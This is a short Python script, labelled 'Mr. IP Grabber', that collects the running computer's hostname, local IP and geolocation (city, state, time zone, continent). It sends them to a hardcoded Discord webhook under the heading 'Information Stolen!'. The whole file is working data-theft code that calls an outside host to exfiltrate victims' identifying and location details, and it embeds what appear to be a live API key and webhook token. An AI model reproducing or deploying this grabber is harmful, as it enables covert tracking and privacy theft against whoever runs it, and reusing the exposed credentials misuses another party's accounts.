from socket import gethostname, gethostbyname
import json
from requests import get
from time import sleep
from discord_webhook import DiscordWebhook, DiscordEmbed

hostname = gethostname()

ip = gethostbyname(hostname)

# Key for geolocation.io
api_key = "3925cc0a19784807beba27bc9acdfeed"

geolocation = get(f"https://api.ipgeolocation.io/ipgeo?apiKey={api_key}")

literal_location = json.loads(
    geolocation.text
)  # Haha >:D This gives us access to all of the *Fancy* location info :)

city = literal_location['city']  # Orlando (Example)

state = literal_location['state_prov']  # Florida (Example)

timezone = literal_location["time_zone"]['name']

continent = literal_location["continent_name"] + " (" + literal_location[
    "continent_code"] + ")"

eb = DiscordEmbed('Information Stolen!',
                  f"Computer Hostname: {hostname}",
                  color="03b2f8")

eb.set_timestamp()

eb.set_author("Mr. IP Grabber")

web_state = (state.replace(" ", "_"))

eb.set_image(literal_location["country_flag"])

eb.add_embed_field(name="State", value=state)
eb.add_embed_field(name="City", value=city)
eb.add_embed_field(name="Time Zone", value=timezone)
eb.add_embed_field(name="Continent", value=continent)
eb.set_footer(text=f"ip: {ip}")

webhook = DiscordWebhook(
    url=
    'https://discord.com/api/webhooks/1016490059551215646/zSOQrANTWFo7K1RR_ltFHWQ_eLNtI1h2k0ZtUNI_dqsg5sos2yVsOxjm35U4h-w8lgS8'
)

webhook.add_embed(eb)

response = webhook.execute()
